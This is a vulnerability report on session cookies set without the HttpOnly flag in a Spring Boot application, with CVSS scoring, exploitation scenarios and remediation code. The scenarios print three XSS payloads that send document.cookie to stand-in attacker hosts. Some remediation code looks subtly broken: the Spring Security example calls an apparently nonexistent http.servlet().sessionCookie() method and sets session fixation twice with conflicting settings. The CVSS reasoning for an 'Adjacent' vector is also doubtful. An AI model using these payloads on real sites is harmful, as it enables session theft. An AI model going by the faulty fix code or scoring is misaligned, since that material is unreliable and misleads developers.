# Missing HttpOnly Flag in Session Cookies

# Vulnerability Case
During a security audit of Acme Corp's Java-based web application—which uses the Spring Boot framework and is deployed on Apache Tomcat—we discovered that session cookies were configured without the `HttpOnly` flag. Manual code review and dynamic analysis using browser developer tools revealed that cookies storing sensitive session tokens were created through the standard Java Servlet API without invoking `cookie.setHttpOnly(true)`. This issue was identified when simulated cross-site scripting (XSS) payloads demonstrated that client-side scripts could retrieve these cookies, potentially exposing vulnerable session information. The absence of the `HttpOnly` attribute significantly increases the risk of cookie theft, leading to unauthorized session hijacking.

```java
// Example vulnerable code from a Java Servlet controlling session management
Cookie sessionCookie = new Cookie("SESSIONID", sessionToken);
sessionCookie.setPath("/");
/* Vulnerability: The HttpOnly flag is missing, allowing client-side scripts 
   to access the cookie via document.cookie in the event of an XSS attack */
response.addCookie(sessionCookie);
```

Without the `HttpOnly` flag, cookies become accessible to client-side JavaScript, which renders them vulnerable to theft through XSS attacks. An attacker could inject malicious scripts into the web application's context (via unsanitized inputs or third-party script injections) to read the cookie contents using `document.cookie`. This would enable session hijacking, allowing the attacker to impersonate legitimate users, escalate privileges, or perform fraudulent actions on behalf of compromised accounts. The business impact is severe, as the unauthorized access to user sessions can lead to data breaches, loss of customer trust, and regulatory non-compliance, especially in environments where sensitive personal or transactional data is handled.


context: java.lang.security.audit.cookie-missing-httponly.cookie-missing-httponly A cookie was detected without setting the 'HttpOnly' flag. The 'HttpOnly' flag for cookies instructs the browser to forbid client-side scripts from reading the cookie. Set the 'HttpOnly' flag by calling 'cookie.setHttpOnly(true);'

# Vulnerability Breakdown
This vulnerability involves the absence of the HttpOnly flag in session cookies within a Java-based web application using Spring Boot and Apache Tomcat. The analysis reveals a critical security configuration issue with significant exploitation potential.

1. **Key vulnerability elements**:
   - Session cookies are created without the `HttpOnly` flag using Java Servlet API
   - These cookies contain sensitive session tokens that maintain user authentication
   - The application fails to invoke `cookie.setHttpOnly(true)` when configuring cookies
   - This configuration error exposes cookies to client-side script access
   - The vulnerability works as an amplifier for XSS attacks

2. **Potential attack vectors**:
   - Requires an existing XSS vulnerability as a prerequisite
   - Attacker can inject JavaScript that accesses `document.cookie`
   - Stolen session tokens enable session hijacking
   - Social engineering may be used to deliver XSS payloads to users

3. **Severity assessment**:
   - The vulnerability requires another vulnerability (XSS) to be exploited, increasing attack complexity
   - Once exploited, it enables unauthorized access to user accounts
   - High confidentiality impact as sensitive session tokens are exposed
   - Low integrity impact through session hijacking capabilities
   - Risk is elevated in applications handling sensitive information

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Adjacent (A) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

# Description
A security vulnerability was identified in Acme Corp's Java-based web application where session cookies are created without the `HttpOnly` flag. This misconfiguration allows client-side JavaScript to access sensitive session tokens through the `document.cookie` API, creating a significant security risk when combined with Cross-Site Scripting (XSS) vulnerabilities.

```java
// Vulnerable code example
Cookie sessionCookie = new Cookie("SESSIONID", sessionToken);
sessionCookie.setPath("/");
// Missing: sessionCookie.setHttpOnly(true);
response.addCookie(sessionCookie);

```

The HttpOnly flag is designed specifically to protect cookies from being accessed by client-side scripts. When this protection is missing, any successful XSS attack can trivially harvest session identifiers, enabling attackers to hijack user sessions and perform unauthorized actions with the victim's privileges. This vulnerability was confirmed during security testing when simulated XSS payloads successfully accessed these session cookies.

# CVSS
**Score**: 5.4 \
**Vector**: CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N \
**Severity**: Medium

The Medium severity rating (CVSS 5.4) reflects the corrected analysis with more precise factors:

- **Adjacent (A) attack vector**: This vulnerability requires an XSS vulnerability to be exploited, making it adjacent rather than directly exploitable over the network.

- **High (H) attack complexity**: The attack complexity is high because it depends on the presence of another vulnerability (XSS) as a prerequisite for exploitation. Without an XSS vulnerability, this issue cannot be exploited.

- **No privileges (N) required**: The attacker doesn't need any privileges to exploit this vulnerability beyond what's needed to trigger the XSS.

- **User interaction (R) required**: Exploitation typically requires user interaction, such as clicking a malicious link or visiting a page containing the XSS payload.

- **Unchanged (U) scope**: The vulnerability affects only the same security authority (the web application itself).

- **High (H) confidentiality impact**: This vulnerability allows complete exposure of sensitive session tokens, which contain authentication information and can lead to full account compromise.

- **Low (L) integrity impact**: If an attacker hijacks a session, they can perform actions as the victim user, potentially modifying data.

- **None (N) availability impact**: This vulnerability doesn't directly affect system availability.

The severity remains Medium because while the confidentiality impact is high (session tokens are highly sensitive), the attack complexity is also high due to the dependency on an XSS vulnerability.

# Exploitation Scenarios
**Scenario 1: Comment-Based XSS Attack**
An attacker discovers that the application's comment feature doesn't properly sanitize user input. They post a comment containing malicious JavaScript: `<script>fetch('https://evil-domain.com/steal?cookies='+encodeURIComponent(document.cookie))</script>`. When other users view the page containing this comment, their browsers execute the script, sending their session cookies to the attacker's server. The attacker then uses these session identifiers to impersonate legitimate users.

**Scenario 2: Phishing with XSS Payload**
An attacker sends targeted emails to application users, containing links to the legitimate application but with XSS payloads in the URL parameters, like: `https://legitimate-app.com/search?q=<script>document.write('<img src="https://attacker.com/log?c='+document.cookie+'"/>')</script>`. If the search feature is vulnerable to XSS, when users click this link, their session cookies are transmitted to the attacker's server, allowing session hijacking.

**Scenario 3: Stored XSS in User Profile**
An attacker updates their own profile with malicious JavaScript in a field that's later displayed to other users (like a bio or status). When administrators or other users view the attacker's profile, the script executes in their browsers: `<script>let img = new Image(); img.src = 'https://malicious-logger.com/log?data='+document.cookie;</script>`. This gives the attacker access to high-privilege session tokens, potentially allowing administrative access.

# Impact Analysis
**Business Impact:**
- Unauthorized access to user accounts leading to data breaches and privacy violations
- Potential financial losses through fraudulent transactions executed via hijacked sessions
- Damage to company reputation and loss of customer trust when breaches are disclosed
- Legal and regulatory consequences, particularly for applications handling personal data (GDPR, CCPA)
- Increased customer support costs dealing with compromised accounts
- Possible intellectual property theft if administrative or privileged sessions are compromised

**Technical Impact:**
- Complete session hijacking allowing attackers to impersonate legitimate users
- Unauthorized access to sensitive user information within the application
- Potential privilege escalation if an administrator's session is compromised
- Ability to perform unauthorized transactions or operations within the application
- Possible use of compromised sessions for further attacks against the application
- Side-stepping of authentication controls without needing actual credentials
- Potential for persistent exploitation if the attacker can maintain access

# Technical Details
The vulnerability stems from improper session cookie configuration in the Java-based web application. When creating cookies using the Java Servlet API, the application fails to set the HttpOnly flag, which is a critical security attribute designed to prevent client-side JavaScript from accessing cookie values.

In the vulnerable code:

```java
Cookie sessionCookie = new Cookie("SESSIONID", sessionToken);
sessionCookie.setPath("/");
// Missing the critical security setting:
// sessionCookie.setHttpOnly(true);
response.addCookie(sessionCookie);

```

**How the vulnerability works:**

1. The application creates cookies containing sensitive session identifiers
2. Without the HttpOnly flag, these cookies become accessible via JavaScript's `document.cookie` API
3. If an XSS vulnerability exists, malicious scripts can read these cookies
4. The script can exfiltrate cookie values to an attacker-controlled server
5. The attacker can then use these session identifiers to hijack the victim's session

**Browser behavior:**
When the browser receives a cookie without the HttpOnly flag, it stores this cookie in a way that allows JavaScript to access it. With the HttpOnly flag set, browsers implement access controls that specifically block JavaScript access, even in the presence of XSS vulnerabilities.

**Why this is problematic:**
Session tokens are high-value authentication artifacts. When stolen, they allow an attacker to bypass authentication entirely and assume the identity of the victim. Unlike passwords which require explicit entry, session tokens are automatically sent with each request, making them particularly valuable targets.

**Technical constraints:**
The HttpOnly flag has broad browser support and should be enabled for all cookies containing sensitive authentication information. There are no technical reasons not to use this protection, as it doesn't impact legitimate application functionality since legitimate code should interact with sessions through backend mechanisms, not client-side JavaScript.

# Remediation Steps
## Enable HttpOnly Flag on Session Cookies

**Priority**: P0

Immediately update all cookie creation code to set the HttpOnly flag:

```java
// Corrected code
Cookie sessionCookie = new Cookie("SESSIONID", sessionToken);
sessionCookie.setPath("/");
sessionCookie.setHttpOnly(true);  // Add this line to enable HttpOnly

// Also consider enabling Secure flag if using HTTPS (recommended)
sessionCookie.setSecure(true);

response.addCookie(sessionCookie);

```

This change prevents client-side JavaScript from accessing the cookie value, protecting it from XSS-based theft. Implement this change across all code that creates session cookies or authentication tokens. For legacy code, conduct a thorough search for all Cookie instantiations to ensure complete coverage.
## Implement Framework-Level Session Configuration

**Priority**: P1

Configure session security at the framework level using Spring Boot's session management capabilities:

```java
// In your application configuration
@Configuration
public class SessionConfig {
    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setUseHttpOnlyCookie(true);
        serializer.setUseSecureCookie(true); // For HTTPS environments
        serializer.setSameSite("Lax"); // Adds SameSite protection
        serializer.setCookiePath("/");
        serializer.setCookieName("SESSIONID"); // Consistent naming
        return serializer;
    }
    
    @Bean
    public CookieHttpSessionIdResolver httpSessionIdResolver() {
        CookieHttpSessionIdResolver resolver = new CookieHttpSessionIdResolver();
        resolver.setCookieSerializer(cookieSerializer());
        return resolver;
    }
}

```

Alternatively, for Spring Security implementations:

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            // Other security configurations...
            .sessionManagement()
                .sessionFixation().migrateSession()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
            .and()
            .headers()
                .frameOptions().deny()
            .and()
            .csrf();

        // Configure the session cookie
        http.sessionManagement()
            .sessionFixation()
            .newSession()
            .maximumSessions(1);
        
        http.servlet().sessionCookie()
            .httpOnly(true)
            .secure(true) // For HTTPS environments
            .sameSite("Lax");
    }
}

```

This approach ensures all session cookies in the application have the HttpOnly flag set, providing a consistent security policy regardless of where cookies are created.


# References
* CWE-1004 | [Sensitive Cookie Without 'HttpOnly' Flag](https://cwe.mitre.org/data/definitions/1004.html)
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* CWE-352 | [Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
* A05:2021 | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
* A07:2021 | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
